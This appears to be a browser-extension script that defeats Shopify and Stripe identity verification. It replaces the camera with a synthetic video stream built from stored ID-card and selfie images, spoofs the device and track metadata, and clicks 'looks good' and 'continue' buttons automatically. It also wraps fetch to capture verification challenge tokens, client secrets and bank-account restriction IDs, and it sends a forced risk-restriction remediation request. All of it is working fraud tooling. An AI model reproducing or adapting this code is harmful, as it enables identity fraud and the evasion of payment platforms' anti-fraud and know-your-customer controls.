// MAIN world — Camera override + Fetch interceptor + Auto-advance

;(function() {

const IDV_DOMAINS = ['shopify.com', 'shopifycloud.com', 'stripe.com', 'myshopify.com']
if (!IDV_DOMAINS.some(d => location.hostname.includes(d))) return

// ─────────────────────────────────────────────────────────────────────────────
// IMAGE STORE — loaded from sessionStorage synchronously (no timing issues)
// ─────────────────────────────────────────────────────────────────────────────
const IDV = {
  dlFront:  sessionStorage.getItem('__idv_dl_front__'),
  dlBack:   sessionStorage.getItem('__idv_dl_back__'),
  selfies:  [
    sessionStorage.getItem('__idv_selfie_0__'),
    sessionStorage.getItem('__idv_selfie_1__'),
    sessionStorage.getItem('__idv_selfie_2__')
  ].filter(Boolean),
  phase:    sessionStorage.getItem('__idv_phase__') || 'id',
  idStep:   0,   // 0=front, 1=back
  selfieStep: 0
}

// Also accept postMessage updates (bridge sends after async storage read)
window.addEventListener('message', ev => {
  if (ev.source !== window || ev.data?._idv !== 'IDV_SET') return
  const d = ev.data
  if (d.dlFront)  IDV.dlFront  = d.dlFront
  if (d.dlBack)   IDV.dlBack   = d.dlBack
  if (d.selfies?.length) IDV.selfies = d.selfies
  if (d.phase)    IDV.phase    = d.phase
  console.log('[IDV] Images received. phase=' + IDV.phase + ' dlFront=' + !!IDV.dlFront)
})

function currentImage() {
  if (IDV.phase === 'selfie') {
    return IDV.selfies?.[IDV.selfieStep] || IDV.selfies?.[0] || IDV.dlFront
  }
  // ID phase: front first, then back
  if (IDV.idStep === 1 && IDV.dlBack) return IDV.dlBack
  return IDV.dlFront
}

// ─────────────────────────────────────────────────────────────────────────────
// CANVAS STREAM BUILDER
// ─────────────────────────────────────────────────────────────────────────────
async function loadImage(src) {
  return new Promise(resolve => {
    const img = new Image()
    img.onload  = () => resolve(img)
    img.onerror = () => resolve(null)
    setTimeout(() => resolve(null), 5000)
    img.src = src
  })
}

async function buildStream(src) {
  const img = await loadImage(src)
  if (!img || !img.naturalWidth) {
    console.log('[IDV] Image load failed')
    return null
  }

  const W = 1280, H = 720
  const canvas = document.createElement('canvas')
  canvas.width = W; canvas.height = H
  const ctx = canvas.getContext('2d')

  // Pre-scale image to fit canvas with padding
  const scaleBase = Math.min(W / img.naturalWidth, H / img.naturalHeight) * 0.88

  // Motion state — drift + breathe to simulate held camera
  let ox = 0, oy = 0, sc = 1.0
  let vx = (Math.random() - 0.5) * 0.25
  let vy = (Math.random() - 0.5) * 0.18
  let vs = 0.00015

  function drawFrame() {
    // Update drift
    ox += vx; oy += vy; sc += vs
    if (Math.abs(ox) > 7)  vx *= -1
    if (Math.abs(oy) > 5)  vy *= -1
    if (sc > 1.018 || sc < 0.982) vs *= -1

    const finalScale = scaleBase * sc
    const iw = img.naturalWidth  * finalScale
    const ih = img.naturalHeight * finalScale
    const x  = (W - iw) / 2 + ox
    const y  = (H - ih) / 2 + oy

    // Background
    ctx.fillStyle = '#0d0d0d'
    ctx.fillRect(0, 0, W, H)

    // ID image
    ctx.drawImage(img, x, y, iw, ih)

    // Vignette (real camera effect)
    const vg = ctx.createRadialGradient(W/2, H/2, H * 0.35, W/2, H/2, H * 0.75)
    vg.addColorStop(0, 'rgba(0,0,0,0)')
    vg.addColorStop(1, 'rgba(0,0,0,0.25)')
    ctx.fillStyle = vg
    ctx.fillRect(0, 0, W, H)
  }

  drawFrame()

  let stream, stopFn

  // Try MediaStreamTrackGenerator first (Chrome 94+ — most realistic)
  if (typeof MediaStreamTrackGenerator !== 'undefined' && typeof VideoFrame !== 'undefined') {
    try {
      const generator = new MediaStreamTrackGenerator({ kind: 'video' })
      const writer = generator.writable.getWriter()
      let running = true
      let lastTs = 0

      async function pump(ts) {
        if (!running) return
        if (ts - lastTs >= 33) {
          drawFrame()
          const frame = new VideoFrame(canvas, { timestamp: Math.round(ts * 1000), duration: 33333 })
          try { await writer.write(frame) } catch(_) {}
          frame.close()
          lastTs = ts
        }
        requestAnimationFrame(pump)
      }
      requestAnimationFrame(pump)

      stream = new MediaStream([generator])
      stopFn = () => { running = false; try { writer.close() } catch(_) {} }

      console.log('[IDV] Using MediaStreamTrackGenerator')
    } catch(e) {
      console.log('[IDV] TrackGenerator failed:', e.message)
      stream = null
    }
  }

  // Fallback: canvas.captureStream
  if (!stream) {
    const iv = setInterval(drawFrame, 33)
    stream = canvas.captureStream(30)
    stopFn = () => clearInterval(iv)
    console.log('[IDV] Using canvas.captureStream')
  }

  // Spoof track metadata to look like real camera
  const track = stream.getVideoTracks()[0]
  if (track) {
    const origGetSettings = track.getSettings.bind(track)
    track.getSettings = () => ({
      ...origGetSettings(),
      width: W, height: H, frameRate: 30,
      facingMode: IDV.phase === 'selfie' ? 'user' : 'environment',
      deviceId: 'idv-virtual-camera',
      groupId:  'idv-virtual-group'
    })
    track.getCapabilities = () => ({
      width: { min: 1, max: 1920, ideal: W },
      height: { min: 1, max: 1080, ideal: H },
      frameRate: { min: 1, max: 60, ideal: 30 },
      facingMode: ['user', 'environment']
    })
    track.getConstraints = () => ({ video: true })

    const origStop = track.stop.bind(track)
    track.stop = () => { stopFn?.(); origStop() }
  }

  return stream
}

// ─────────────────────────────────────────────────────────────────────────────
// PATCH getUserMedia
// ─────────────────────────────────────────────────────────────────────────────
if (navigator.mediaDevices) {
  const _origGUM = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices)

  navigator.mediaDevices.getUserMedia = async function(constraints) {
    if (!constraints?.video) return _origGUM(constraints)

    // Wait up to 10s for images (bridge is async)
    for (let i = 0; i < 50; i++) {
      if (IDV.dlFront) break
      // Also check sessionStorage directly
      const ss = sessionStorage.getItem('__idv_dl_front__')
      if (ss) { IDV.dlFront = ss; break }
      await new Promise(r => setTimeout(r, 200))
    }

    const src = currentImage()
    if (!src) {
      console.log('[IDV] No image — real camera')
      return _origGUM(constraints)
    }

    console.log('[IDV] Building fake stream (phase=' + IDV.phase + ')')
    const fakeStream = await buildStream(src)
    if (!fakeStream) {
      console.log('[IDV] Stream build failed — real camera')
      return _origGUM(constraints)
    }

    return fakeStream
  }

  // Override enumerateDevices so Shopify sees a camera
  const _origEnum = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices)
  navigator.mediaDevices.enumerateDevices = async function() {
    const real = await _origEnum().catch(() => [])
    if (!real.some(d => d.kind === 'videoinput')) {
      real.unshift({
        deviceId: 'idv-virtual-camera',
        groupId:  'idv-virtual-group',
        kind:     'videoinput',
        label:    'IDV Virtual Camera',
        toJSON() { return { deviceId: this.deviceId, groupId: this.groupId, kind: this.kind, label: this.label } }
      })
    }
    return real
  }

  // Override ImageCapture (Shopify may use grabFrame())
  if (typeof ImageCapture !== 'undefined') {
    const _OrigImageCapture = ImageCapture
    window.ImageCapture = class IDVImageCapture extends _OrigImageCapture {
      constructor(track) {
        super(track)
        this._track = track
      }
      async grabFrame() {
        const src = currentImage()
        if (!src) return super.grabFrame()
        const img = await loadImage(src)
        if (!img) return super.grabFrame()
        const bm = await createImageBitmap(img)
        return bm
      }
      async takePhoto(opts) {
        const src = currentImage()
        if (!src) return super.takePhoto(opts)
        const img = await loadImage(src)
        if (!img) return super.takePhoto(opts)
        const canvas = document.createElement('canvas')
        canvas.width = img.naturalWidth; canvas.height = img.naturalHeight
        canvas.getContext('2d').drawImage(img, 0, 0)
        return new Promise(resolve => canvas.toBlob(b => resolve(b), 'image/jpeg', 0.95))
      }
    }
    console.log('[IDV] ImageCapture override installed')
  }

  console.log('[IDV] Camera patch installed on', location.hostname)
}

// ─────────────────────────────────────────────────────────────────────────────
// PHASE AUTO-DETECTOR (watches DOM for selfie/ID text)
// ─────────────────────────────────────────────────────────────────────────────
const SELFIE_WORDS = ['selfie', 'your face', 'look at the camera', 'photo of yourself',
                      'position your face', 'face forward', 'center your face']
const ID_WORDS     = ['move your id', 'hold your id', 'front of', 'back of',
                      'driver', 'passport', 'national id', 'place your id']
const BACK_WORDS   = ['back of', 'flip your', 'other side', 'back side']
const CAPTURED_WORDS = ['captured', 'looks good', 'use this photo', 'confirm']

let _lastPhase = IDV.phase
let _autoClickTimer = null

function checkPhase() {
  const text = document.body?.innerText?.toLowerCase() || ''

  // Detect back-of-ID step
  if (IDV.phase === 'id' && IDV.idStep === 0 && BACK_WORDS.some(w => text.includes(w))) {
    IDV.idStep = 1
    console.log('[IDV] ID step → back')
  }

  // Detect selfie step
  if (IDV.phase !== 'selfie' && SELFIE_WORDS.some(w => text.includes(w))) {
    IDV.phase = 'selfie'
    IDV.selfieStep = 0
    sessionStorage.setItem('__idv_phase__', 'selfie')
    window.postMessage({ _idv: 'IDV_PHASE_REQUEST', phase: 'selfie' }, '*')
    console.log('[IDV] Phase → selfie')
  }

  // Auto-click "Looks good" / "Continue" after capture
  if (CAPTURED_WORDS.some(w => text.includes(w))) {
    clearTimeout(_autoClickTimer)
    _autoClickTimer = setTimeout(autoClick, 1200)
  }
}

function autoClick() {
  const CLICK_PRIORITY = [
    'looks good', 'use this photo', 'use photo', 'confirm',
    'continue', 'next', 'submit', 'done'
  ]
  const btns = [...document.querySelectorAll('button, [role="button"]')]
    .filter(b => !b.disabled && b.offsetParent !== null)

  for (const phrase of CLICK_PRIORITY) {
    const btn = btns.find(b => b.textContent?.toLowerCase().trim().includes(phrase))
    if (btn) {
      console.log('[IDV] Auto-click:', btn.textContent.trim())
      btn.click()
      return
    }
  }
}

function startDOMWatcher() {
  const run = () => {
    if (!document.body) return
    checkPhase()
    new MutationObserver(checkPhase)
      .observe(document.body, { childList: true, subtree: true, characterData: true })
  }
  if (document.body) run()
  else document.addEventListener('DOMContentLoaded', run)
}
startDOMWatcher()

// ─────────────────────────────────────────────────────────────────────────────
// FETCH INTERCEPTOR — captures Shopify/Stripe tokens
// ─────────────────────────────────────────────────────────────────────────────
const FETCH_PATTERNS = [
  'banking_home_banking', 'payments/banking',
  'shopify/graphql', 'verificationhub.shopify.com', 'verify.stripe.com'
]

function getStore() {
  const m = location.pathname.match(/\/store\/([^/?#]+)/)
  return m?.[1] ?? null
}

function gidToId(gid) {
  if (!gid) return null
  const m = String(gid).match(/\/(\d+)$/)
  return m ? m[1] : String(gid)
}

function parseCaptures(url, data) {
  const out = {}

  if (url.includes('banking_home_banking') || url.includes('payments/banking')) {
    const ba = data.bankAccount || data?.data?.bankAccount
    if (ba?.id) { out.bank_account_id = gidToId(ba.id); out.bank_account_gid = ba.id }
    const restrictions = ba?.riskRestrictions || []
    const active = restrictions.find(r => r.status === 'ACTIVE')
    if (active) {
      out.active_restriction_id     = gidToId(active.id)
      out.active_restriction_gid    = active.id
      out.active_restriction_status = 'ACTIVE'
    }
    const principal = data.principal || data?.data?.principal
    if (principal?.id) { out.principal_id = gidToId(principal.id) }
    out._event = 'banking_home'
  }

  if (url.includes('shopify/graphql') || url.includes('verificationhub.shopify.com')) {
    const d = data.data || {}
    const pgrr = d.payoutGateRemediate
    if (pgrr?.challengeToken) { out.jwt = pgrr.challengeToken; out.jwt_type = 'pgrr'; out._event = 'pgrr' }
    const rrr = d.remediateRiskRestriction
    if (rrr?.challengeToken) { out.jwt = rrr.challengeToken; out.jwt_type = 'remediate'; out._event = 'remediate' }
    for (const k of Object.keys(d)) {
      if (k.startsWith('createIVA') || k.startsWith('createIdentityVerification')) {
        const vs = d[k]?.verificationSession
        if (vs) {
          out.ek = vs.id; out.ek_client_secret = vs.clientSecret
          out.assessment_ref = vs.referenceId; out.civa_variant = k; out._event = 'civa'
          break
        }
      }
    }
    const ca = d.createAssessment
    if (ca?.assessmentReference) { out.vhub_assessment_ref = ca.assessmentReference; out._event = 'vhub' }
    const bh = d.shopifyPaymentsAccount?.bankAccount || d.bankAccount
    if (bh?.riskRestrictions !== undefined) {
      const hasActive = bh.riskRestrictions.some(r => r.status === 'ACTIVE')
      out.discharge_detected = !hasActive
      out._event = hasActive ? 'poll_active' : 'discharge'
    }
  }

  if (url.includes('verify.stripe.com')) {
    const session = data.session || data
    if (session.status) { out.stripe_session_status = session.status; out._event = 'stripe_' + session.status }
  }

  return Object.keys(out).filter(k => !k.startsWith('_')).length > 0 ? out : null
}

function sendCapture(url, data) {
  const captures = parseCaptures(url, data)
  if (!captures) return
  window.postMessage({ _idv: 'CAPTURE', store: getStore(), url, captures, timestamp: Date.now() }, '*')
}

// Force verify handler
window.addEventListener('message', async ev => {
  if (ev.source !== window || ev.data?._idv !== 'FORCE_VERIFY') return
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || window?.Shopify?.csrfToken || ''
  const mutation = `mutation RemediateIDV($id:ID!){remediateRiskRestriction(input:{riskRestrictionId:$id}){challengeToken userErrors{field message}}}`
  try {
    const res = await _origFetch('https://admin.shopify.com/api/shopify/graphql.json', {
      method: 'POST', credentials: 'include',
      headers: { 'Content-Type': 'application/json', ...(csrf ? { 'X-CSRF-Token': csrf } : {}) },
      body: JSON.stringify({ operationName: 'RemediateIDV', query: mutation, variables: { id: ev.data.riskRestrictionId } })
    })
    const data = await res.json()
    sendCapture('shopify/graphql', data)
    const rrr = data?.data?.remediateRiskRestriction
    if (rrr?.challengeToken) {
      window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: true } }, '*')
    } else {
      const errs = rrr?.userErrors?.map(e => e.message).join(', ') || 'unknown error'
      window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: false, error: errs } }, '*')
    }
  } catch(e) {
    window.postMessage({ _idv: 'FORCE_VERIFY_RESULT', result: { ok: false, error: String(e) } }, '*')
  }
})

const _origFetch = window.fetch.bind(window)
window.fetch = async function(input, init) {
  const res = await _origFetch(input, init)
  const url = typeof input === 'string' ? input : input?.url || ''
  if (FETCH_PATTERNS.some(p => url.includes(p))) {
    res.clone().json().then(data => sendCapture(url, data)).catch(() => {})
  }
  return res
}

})()
